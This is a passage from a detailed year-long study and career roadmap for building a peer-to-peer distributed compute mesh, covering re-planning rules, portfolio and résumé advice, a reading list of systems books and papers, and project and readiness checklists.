| **The Week-2 scale spike fails** — you can't run enough nodes, or NAT traversal is impossible from your connection | **Decide in Week 2.** The substitute: simulator-first from day one, with the real mesh reduced to 5–10 nodes for protocol validation only, and this stated in the README as the primary limitation. **Do not carry the uncertainty forward.** |
| **A level runs 2+ weeks over** | Don't compress the next. Take it from the next buffer week and cut the lowest-value item in the *following* level. |
| **Response rate <10% at W43** | Diagnose per §J.7 **before** sending more. |
| 🔴 **You haven't opened the repo in 7 days** | **The most important trigger and the easiest to ignore.** Do not restart at 30 hours. One 2-hour session, then one 4-hour session, then resume. **Restarting at full intensity after a break is how a one-week gap becomes a one-month one.** |

## What does NOT trigger a re-plan

- **A bad week.** Noise.
- **A target you missed.** Targets set before measurement are estimates. **Record both numbers and move on.**
- **A negative result.** The colluding-liars finding, or a sim-fidelity divergence larger than you hoped, **are results.** They get written up and become interview material.
- **Feeling behind.** Check `LOG.md`.
- 🔴 **A better project idea.** It will happen, probably around Level 4 and again around Level 8. **The answer is no.** Write it in `docs/IDEAS.md` and continue. **You have already changed spine once, at week zero, when it was free. Changing again in month four costs you the accumulated depth that is the entire point of a single system.**

---
---

# 💼 RÉSUMÉ & GITHUB TRANSLATION

## Six pinned repos, chosen for legibility

```
📌 swarm             P2P distributed compute mesh · C++ / Go / Python · WASM sandbox,
                     Kademlia DHT, Raft regions, Byzantine-tolerant verification
                     ★ architecture diagram + headline numbers + the prior-art and
                       scale statements, all in the first screen

📌 trustcurve        How much redundancy do you need to trust a stranger's computer?
                     ★ THE curve. One chart. Nobody has published this.

📌 dht-arena         Chord vs Kademlia under 30% churn, one testbed
                     ★ hop counts, lookup success, maintenance traffic — the comparison
                       that didn't exist

📌 swarmsim          Deterministic simulation with Byzantine faults · 10k seeds nightly
                     ★ "three bugs no test suite would have caught," with the seeds

📌 incident-lab      Six famous outages reproduced locally, with verified fixes
                     ★ the table of outages is the hook

📌 overload          Goodput collapse curves under 5x offered load
                     ★ collapse and graceful, same axes
```

**Every README, first screen:** one sentence saying what it is · an architecture diagram · **the headline number or chart** · `make demo`.
**Profile README:** three sentences about what you work on, then the six with their numbers. **No badge walls. No language-percentage charts.**

## The interview answer this buys you

> *"Tell me about the most technically challenging thing you've built."*

A 45-minute answer with: an architecture diagram you can draw from memory · **three specific bugs and how a simulator you wrote found them** · measured numbers and where the bottleneck is · a defensible reason for every technology choice · **the alternatives you rejected, written down as ADRs** · **an honest comparison to the five real systems that solved pieces of this before you** · and **a retrospective with measured estimate-versus-actual**, which tells an interviewer more about how you'd estimate *their* project than anything else in the repo.

---
---

# 📚 THE COMPLETE LIBRARY

## The spine — with the chapters that matter

| # | Book | When | Chapters |
|---|---|---|---|
| 1 | **Kleppmann, *DDIA*** *(you own it)* | Throughout | **Ch. 3** (storage, L3) · **5–6** (replication, partitioning, L4) · **7** (transactions, F6) · **8** (partial failure — **the theoretical spine of SWARM**, L2/L5) · **9** (consensus + Byzantine, L5/L8) · **11** (streams, L8) |
| 2 | **Alex Xu, *System Design Interview* Vol. 1 & 2** *(you own them)* | L4, L7, Track I | **Vol 1 ch. 1** (estimation) · **ch. 4** (rate limiting, L7) · **ch. 5** (consistent hashing, L4) · **ch. 6, 8** (cache, CDN) · **ch. 11** (queues) · **Vol 2** for the applied designs |
| 3 | **Bryant & O'Hallaron, *CS:APP* 3rd ed.** | L0, L3, F10 | **§6.2–6.4** (memory hierarchy) · **ch. 5** (optimising performance) · **§6.4–6.6** |
| 4 | **Arpaci-Dusseau, *OSTEP*** *(free)* | L1, L2 | **Ch. 4–7** (processes, scheduling) · **13–16, 18–19** (VM, TLB) · **25–33** (concurrency) |
| 5 | **Kurose & Ross, *Computer Networking* 8th ed.** | L2 | **Ch. 3 in full.** The most valuable chapter in the book. |
| 6 | **Fall & Stevens, *TCP/IP Illustrated Vol. 1*** | L2 | **Ch. 13, 14, 15.** Those three. |
| 7 | **Grigorik, *High Performance Browser Networking*** *(free, hpbn.co)* | L2 | **Ch. 1–4**, and **ch. 3 on UDP** specifically |
| 8 | **Petrov, *Database Internals*** | L3 | **Ch. 2–5.** Part I is the best storage-engine treatment in print. Skip Part II. |
| 9 | **Nygard, *Release It!* 2nd ed.** | L7, L10 | **The origin of circuit breaker and bulkhead. The single most relevant book to Levels 7 and 10.** |
| 10 | **Google, *SRE* + *SRE Workbook*** *(free)* | L7–L10 | **SRE ch. 3, 4, 6, 21, 22** (ch. 22 is the most valuable) + **Workbook ch. 5** |
| 11 | **Majors, Fong-Jones, Miranda, *Observability Engineering*** | L7 | **Ch. 1–6** |
| 12 | **Lukša, *Kubernetes in Action* 2nd ed.** | L7 | **Ch. 1–7, 12, 17** |
| 13 | **Aumasson, *Serious Cryptography* 2nd ed.** | L3, L7 | **Ch. 1, 2, 3, 6, 7, 9, 10, 11** |
| 14 | **Gregg, *Systems Performance* 2nd ed.** | L0, F10 | **Ch. 6 §6.6, ch. 13.** Reference. |
| 15 | **Mitzenmacher & Upfal, *Probability and Computing*** | F8 | **Ch. 5** (balls into bins — literally your load-distribution problem), **§14.1** |
| 16 | **Ousterhout, *A Philosophy of Software Design*** | L3 | Short, sharp, contradicts parts of *Clean Code* while being more right |
| 17 | **Skiena, *Algorithm Design Manual* 3rd ed.** | L5, Track I | **Ch. 8** (DP), **ch. 9** (intractability and reductions) |
| 18 | **Laaksonen, *Competitive Programmer's Handbook*** *(free)* | Track I | **Ch. 7, 9, 13–15, 26** |
| 19 | **Winters, Manshreck, Wright, *Software Engineering at Google*** *(free)* | Track J | **Ch. 9** (code review), **11–14** (testing at scale) |
| 20 | **Reilly, *The Staff Engineer's Path*** | L11–12 | What comes after senior |

## The papers — cited at first assignment, one page of notes each

| Paper | Week | Why |
|---|---|---|
| **Das, Gupta, Motivala, "SWIM" (DSN 2002)** | W6 | Membership. Short and unusually clear. |
| **Hayashibara et al., "The φ Accrual Failure Detector" (SRDS 2004)** | W6 | Failure detection |
| **RFC 8445 (ICE) §2**, and the STUN/TURN model | W7 | NAT traversal |
| **"Bitcask: A Log-Structured Hash Table"** | W10 | 6 pages, your v1 target |
| **Rebello et al., "Can Applications Recover from fsync Failures?"** + the PostgreSQL fsyncgate thread | W10 | Why you can't retry fsync |
| **Athanassoulis et al., "The RUM Conjecture"** | W10 | Read/Update/Memory — pick two |
| **Benet, "IPFS"** | W12 | Content addressing, Merkle DAG |
| **Muthitacharoen, Chen, Mazières, "A Low-bandwidth Network File System" (SOSP 2001)** | W12 | **The origin of content-defined chunking.** Short, beautiful |
| **The BLAKE3 spec §2** | W12 | Tree-structured hashing |
| **Karger et al., "Consistent Hashing and Random Trees" (STOC 1997)** | W14 | The original |
| **Stoica et al., "Chord" (SIGCOMM 2001)** | W15 | The canonical DHT |
| **Maymounkov & Mazières, "Kademlia" (IPTPS 2002)** | W16 | **Read §2 on the XOR metric properly — the symmetry argument is the insight** |
| **Rhea et al., "Handling Churn in a DHT" (USENIX ATC 2004)** | W17 | **Read AFTER you've measured, and compare your numbers to theirs** |
| **Ongaro & Ousterhout, Raft — EXTENDED version** | W18 | §5 in full, §6 carefully |
| **Ongaro's PhD thesis** | W19 | Log compaction, membership changes |
| **Zhou et al., "FoundationDB" (SIGMOD 2021) §4** | W22 | Simulation |
| **Newcombe et al., "How AWS Uses Formal Methods" (CACM 2015)** | W23 | Why TLA+ is worth your hours |
| **Dean & Barroso, "The Tail at Scale" (CACM 2013)** | W28 | Eight pages. The basis of Level 7. |
| **Mitzenmacher, "The Power of Two Choices: A Survey"** | W27 | Placement |
| **Bronson et al., "Metastable Failures" (HotOS 2021)** | W29 | The failure class nobody names |
| **Anderson, "BOINC" (GRID 2004)** + BOINC's replication/credit docs | W31 | 🔴 **Twenty years of production experience with your exact problem.** Cite it. |
| **Castro & Liskov, "PBFT" (OSDI 1999)** — abstract and §1–2 | W31 | So you can say what you deliberately didn't build |
| **Douceur, "The Sybil Attack" (IPTPS 2002)** | W32 | The honest limit of any open reputation system |
| **Kwon et al., "PagedAttention / vLLM" (SOSP 2023)** | W36 | Why inference serving is hard |
| **Lamport, "Time, Clocks, and the Ordering of Events" (1978)** | W41 | Eight pages, most cited in the field |
| **Berenson, Bernstein, Gray et al., "A Critique of ANSI SQL Isolation Levels" (1995)** | F6 | Named the anomalies the standard forgot |

**For each: a one-page summary** — what problem, what was the key insight, what did they give up, what would you do differently in 2027, what system today embodies it. **Twenty-six one-pagers is a genuinely impressive public artifact.**

## Free reference
`aws.amazon.com/builders-library` **(read all ~20 across Levels 7–10)** · `k8s.af` **(read 10)** · `jepsen.io/analyses` · `sre.google/books` · `learntla.com` · `github.com/danluu/post-mortems` · `google.github.io/eng-practices` · `use-the-index-luke.com` · `hpbn.co` · `neetcode.io` · `levels.fyi` · `brooker.co.za`

## People
Martin Kleppmann · **Marc Brooker** (`brooker.co.za` — the best working systems writer today) · Brendan Gregg · Julia Evans · Dan Luu · Kyle Kingsbury (aphyr) · Hillel Wayne · Charity Majors · Alex Petrov · **Joe Armstrong's and the TigerBeetle team's writing on simulation** · Gergely Orosz (*The Pragmatic Engineer*)

---
---

# ✅ THE COMPLETE PROJECT CATALOG

**🚩 flagship · ⭐ core · ○ optional**

### Level 0 — Machine, Memory & Measurement
- [ ] ⭐ `latency-lab` — your machine's latency ladder, cache sizes derived from your own plot
- [ ] ⭐ `bench/` — the **open-loop** harness with `perf` integration, used all year
- [ ] ⭐ `sickbay` — 8 injectable pathologies, median diagnosis <10 min
- [ ] ⭐ **`docs/SCALE-RISK.md`** — node ceiling, NAT verdict, **the signed go/no-go**

### Level 1 — The Executor
- [ ] ⭐ **S0** — WASM sandbox, fuel metering, cgroup backstop, durable job log
- [ ] ⭐ **The four attacks, all failing**, each with a test
- [ ] ⭐ **The 100-run determinism test** — the property Level 8 depends on
- [ ] ⭐ `docs/design/threat-model.md` — **including what you do NOT defend against**

### Level 2 — Peer Communication
- [ ] ⭐ `c10k-arena` — six models to 50k connections, **including under cgroup throttling**
- [ ] ⭐ **S1** — wire protocol, SWIM, NAT traversal, relay on Oracle
- [ ] ⭐ **Phi-accrual vs fixed timeout: false-positive rate under jitter, charted**
- [ ] ⭐ **The asymmetric-partition test**
- [ ] ⭐ Membership traffic flat vs the naive O(N²) curve, one chart

### Level 3 — Storage & Content Addressing
- [ ] 🚩 **#1 `crashdb`** + torture harness — 1,000 kill cycles, `LD_PRELOAD` fault injection, zero violations
- [ ] ⭐ **S2** — hexagonal core, **full suite in <2s with no real time, network, disk or sandbox**
- [ ] ⭐ **S3** — content addressing, **CDC vs fixed chunking on a front-insertion workload**, Merkle DAG, concurrent-safe GC
- [ ] ⭐ BLAKE3 vs SHA-256 on your machine, with the choice justified

### Level 4 — The DHT
- [ ] 🚩 **#2 `dht-arena`** — **Chord AND Kademlia, one testbed, 4 churn levels, 5 metrics**
- [ ] ⭐ Consistent hashing vs `mod N`: keys-moved-per-departure, both curves
- [ ] ⭐ Load variance at 1/10/100/500 vnodes, plotted; bounded-load variant
- [ ] ⭐ **O(log N) hops verified empirically at three mesh sizes**

### Level 5 — Consensus
- [ ] 🚩 **#3 `raft`** — 1,000 elections no split-brain; 500 partition schedules, minority can't commit
- [ ] ⭐ **The Figure 8 scenario as a deliberate test** — and drawable from memory
- [ ] ⭐ ReadIndex / lease reads, with the latency difference measured
- [ ] ⭐ **S5** — leader killed mid-commit, **zero lost, zero duplicated assignments**
- [ ] ⭐ **Fencing tokens: the violation without, the fix with, same seed**
- [ ] ⭐ `docs/design/exactly-once.md` — **what you actually guarantee**
- [ ] ○ Gossip Glomers 1–4, 6.5840 Lab 2

### Level 6 — Correctness
- [ ] 🚩 **#4 `swarmsim`** — 6 sim components, **`LyingNode` as a first-class fault**, 10k seeds nightly
- [ ] ⭐ **≥3 real bugs found, each with its seed and trace, in the README**
- [ ] ⭐ **The colluding-liars seed that defeats majority-of-3**
- [ ] ⭐ TLA+ spec of the verification protocol, **≥1 design bug found by TLC**
- [ ] ⭐ `docs/analysis/tla-vs-dst.md` — what each catches that the other misses

### Level 7 — Scheduling, Overload & Kubernetes
- [ ] ⭐ Six placement strategies benchmarked; resource-vector packing vs a brute-force optimum
- [ ] 🚩 **#5 `overload`** — **the goodput collapse curves, six strategies, one chart**
- [ ] ⭐ Retry amplification measured then bounded; **a metastable failure reproduced then fixed**
- [ ] ⭐ **The deep-health-check cascade**, demonstrated then fixed
- [ ] ⭐ 30-node mesh on k3s; **rolling restart with zero lost jobs**
- [ ] ⭐ **`docs/design/trustless-observability.md`** — facts vs claims
- [ ] ⭐ `gatekeep` — mTLS, peer identity as certificate, expiry alert, `gitleaks` in CI
- [ ] ⭐ **F12: the harness audit, and every benchmark re-run if it fails**

### Level 8 — Trust, Tenancy & Cloud
- [ ] 🚩 **#6 `trustcurve`** — **THE CURVE.** Redundancy vs P(accept wrong), by liar fraction and reputation history, with cost overlaid
- [ ] ⭐ The collusion threshold, derived and verified in simulation
- [ ] ⭐ **The sleeper attack: how many wrong results before detection** — the number, in the README
- [ ] ⭐ Multi-tenancy: one tenant at 100x, **others degrade <10%**; shuffle-sharding blast-radius chart
- [ ] ⭐ **aarch64 port + per-component x86-vs-ARM delta**
- [ ] ⭐ `costwatch` — Terraform, hand-written IAM, **a tested billing alarm**, free-tier drift detection
- [ ] ⭐ 🔴 **`docs/analysis/sim-fidelity.md`** — real mesh vs simulation, and the 200-node GCP validation
- [ ] ⭐ **$0.00 verified and screenshotted, every month**

### Level 9 — AI Infrastructure
- [ ] 🚩 **#7 `llm-peer`** — capability advertisement, continuous batching, **≥40% prefix-cache saving**
- [ ] ⭐ **Peer death mid-generation: re-routed, not double-billed**
- [ ] ⭐ TTFT and inter-token latency, with and without batching
- [ ] ⭐ **The honest statement that inference isn't deterministic and majority vote doesn't apply**

### Level 10 — Operations & On-Call
- [ ] 🚩 **#8 `incident-lab`** — **6+ famous outages reproduced with verified fixes**
- [ ] ⭐ **The seven-mechanisms synthesis essay.** Published.
- [ ] ⭐ **20+ SWARM incidents**, each with alert, timeline, root cause, runbook
- [ ] ⭐ **The clock-skew incident** + the quarantine invariant
- [ ] ⭐ **The relay-SPOF incident**, honestly written up
- [ ] ⭐ **A real restore from the S3 artifact mirror**, timed
- [ ] ⭐ `docs/REPORT.md` — 15–25 pages **with the limitations section**

### Level 11 — Platform Completion
- [ ] ⭐ OpenAPI 3.1 with **CI drift detection** · versioning · keyset pagination + the offset benchmark · idempotency keys · RFC 9457 errors · **a pinned old-client compatibility suite**
- [ ] ⭐ `pgshift` — **50M rows under live load, zero errors, both graphs in the README**
- [ ] ⭐ Dashboard — **2,000 WebSockets, memory bound demonstrated, the jitter test**
- [ ] ⭐ `admin` + **the runbook tested by a peer**, sticking points recorded and fixed
- [ ] ⭐ SBOM, pinned deps, **CI fails on a critical CVE**

### Level 12 — Synthesis
- [ ] ⭐ README final, **tested on a human with a ten-minute timer** · `TOUR.md` · final diagram · benchmarks on both architectures
- [ ] ⭐ **The 10 ADRs** · `LIMITATIONS.md` on the first screen · **`COMPARISON.md` vs BOINC, IPFS, Golem/Akash, Ray, Kubernetes**
- [ ] ⭐ **`RETROSPECTIVE.md`** — estimate vs actual per level, every pre-measurement target with both numbers
- [ ] ⭐ The talk or long-form post · **`docs/NEXT.md`**

### Cross-cutting
- [ ] ⭐ **700+ problems** with the failure log and category counts at W13/26/39/48
- [ ] ⭐ **12+ full timed loops** · 8 design docs + 20 practised designs · 14 behavioural stories on video
- [ ] ⭐ **10 design docs · 26 paper one-pagers · 8 published posts · 3+ merged OSS PRs · 1 talk**
- [ ] ⭐ **4 CV versions in git history** · **~150 applications logged with response rate and stage conversion**

---
---

# 🏁 THE FINAL READINESS CHECKLIST

## Can you build it?
- [ ] A sandbox that survives four real attacks and executes deterministically
- [ ] A storage engine that survives 1,000 kills and injected `fsync` failures
- [ ] Gossip membership whose traffic is flat as the mesh grows, with a measured false-positive rate
- [ ] Two DHTs, benchmarked against each other under 30% churn
- [ ] Raft, with the Figure 8 case as a deliberate test and no split-brain in 1,000 runs
- [ ] A deterministic simulator that found three bugs your tests didn't, each reproducible from an integer
- [ ] A verification layer a single liar cannot beat — **and a curve saying what it costs**
- [ ] Goodput held at 5x offered load by shedding rather than collapsing

## Can you explain it?
- [ ] Why a container is not a security boundary, and what WASM gives you that it doesn't
- [ ] Why deterministic execution is load-bearing for everything in month eight
- [ ] Why SWIM is O(N) and naive membership is O(N²); what indirect probing buys
- [ ] Why XOR symmetry helps Kademlia under churn — **from your own numbers**
- [ ] Raft's Figure 8, at a whiteboard, in five minutes
- [ ] Why you put consensus in regions rather than everywhere
- [ ] Coordinated omission, and why you re-measured six months of results
- [ ] Why two colluding liars beat majority-of-three, and the general threshold
- [ ] What a metastable failure is and how you get out of one
- [ ] Why p99 goes vertical at 90% utilisation
- [ ] **Why you did NOT build PBFT, and what you gave up**
- [ ] **Why you did NOT add a blockchain**
- [ ] **How you know your simulator reflects reality**

## Can you diagnose it?
- [ ] Root-cause a sabotaged mesh in under 45 minutes, with evidence
- [ ] Read a flame graph in 10 seconds and say what you'd fix
- [ ] Given "p99 is 3s, CPU is 8%", name three causes and the command that distinguishes them
- [ ] Given green dashboards and wrong answers, **find the clock**
- [ ] Given a peer's self-reported metric, know whether it's a fact or a claim

## Can you interview?
- [ ] 700+ problems, ≥70% unaided in 25 minutes
- [ ] A random Medium, **narrated**, in 25 minutes, on video, repeatedly
- [ ] 20 system designs, 45 min each, hitting the rubric
- [ ] 14 behavioural stories, ≤90s, quantified, first person
- [ ] **12+ full timed loops** · **the Final Gauntlet passed**

## Do they know you exist?
- [ ] 6 pinned repos, each with a diagram and a headline number in the first screen
- [ ] 8+ technical posts published — **at least one about a result, not a tutorial**
- [ ] 3+ merged OSS PRs, one non-trivial, **ideally in libp2p or Wasmtime**
- [ ] One talk given
- [ ] **15–18 people at target companies who know what you're building, from conversations that started in January**
- [ ] A CV where **every bullet has a number**

---

# 🎯 What success means on 2027-09-05

**Not an offer.** Offer timing is not under your control, the strongest window falls just past the end of this plan, and treating an offer as the criterion makes you optimise for the wrong things in Levels 9–11.

> **The criterion: you are a candidate who cannot be screened out on credentials, and cannot be caught out in a system design round.**

If that's true and you have no offer yet, **the plan worked and the timing hasn't resolved.** Execute `docs/NEXT.md` through October.

If it isn't true, **`docs/RETROSPECTIVE.md` tells you which level to return to — with numbers rather than a feeling.**

---

# Closing

Three things decide whether this works.

**1. You must actually reproduce the failures.** The Walls are not flavour text. Reading "untrusted code is dangerous" produces a fact you'll forget. Watching a job you submitted read your own SSH key and hand it back as a result produces an instinct you'll have for twenty years. **The three you'll remember longest:** the four attacks that all worked in Week 3 · two peers behind two home routers unable to reach each other in either direction · and the seed in Week 25 where two lying peers agreed with each other and your majority vote confidently accepted a wrong answer.

**2. You must run all three tracks at once.** Depth without the interview track means nobody sees the depth. The interview track without depth gets you an L4 offer and a six-year stall. Craft without either is empty. **It is genuinely harder to run three tracks than one, and it is the reason most people who "study systems for a year" don't convert it into an offer.**

**3. You must ship publicly, and honestly.** The gap between *"I understand distributed systems"* and *"here is a peer-to-peer compute mesh, here are two DHTs benchmarked against each other under churn, here is the simulator that found three bugs my tests couldn't, here is the curve showing what it costs to trust a stranger's computer, here are the twenty incidents I caused on purpose, and here is the document listing everything this doesn't do"* — **that gap is the entire difference between a candidate and a hire.**

This is roughly **1,450 hours across twelve months.** The output is not "a person who finished a roadmap." The output is an engineer who has run untrusted code safely, made strangers' machines find each other across the real internet, built a storage engine that survives being killed a thousand times, implemented and benchmarked two distributed hash tables, written Raft from the paper, built a simulator that models nodes which lie, measured what it costs to trust one, kept the whole thing standing under five times its capacity on hardware that costs nothing — **and can explain any of it at a whiteboard from memory, including the parts that don't work.**

There are not many of those. **And exactly one posting in 569 cares what your degree says.**

**Now go write a job that reads your own SSH key, and watch it succeed.**
